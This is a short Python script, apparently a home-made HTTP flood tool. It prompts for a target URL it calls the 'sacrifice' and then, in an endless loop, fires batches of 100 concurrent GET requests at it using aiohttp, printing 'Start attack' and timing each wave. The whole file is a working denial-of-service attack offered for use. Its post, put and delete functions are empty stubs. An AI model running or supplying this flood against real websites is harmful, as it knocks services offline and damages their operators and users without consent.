import datetime
import asyncio

import aiohttp
from aiohttp import ClientTimeout


def timer(func):
    async def wrapper(*args, **kwargs):
        time_start = datetime.datetime.now()
        print("Start attack")
        result = await func(*args, **kwargs)
        time_finish = datetime.datetime.now()
        print(time_finish - time_start)
        return result
    return wrapper


@timer
async def get(url: str) -> None:

    timeout = ClientTimeout(sock_read=0.5)
    connector = aiohttp.TCPConnector(limit=500, limit_per_host=500,force_close=True)
    async with aiohttp.ClientSession(connector=connector,timeout=timeout) as session:
        task = [asyncio.create_task(session.get(url))
        for i in range(100)]
        await asyncio.gather(*task)


async def post(url) -> None:
    pass


async def put(url) -> None:
    pass


async def delete(url) -> None:
    pass





async def main():
    url = str(input("Input url sacrifice: "))
    while True:
        await get(url)


if __name__ == '__main__':
    asyncio.run(main())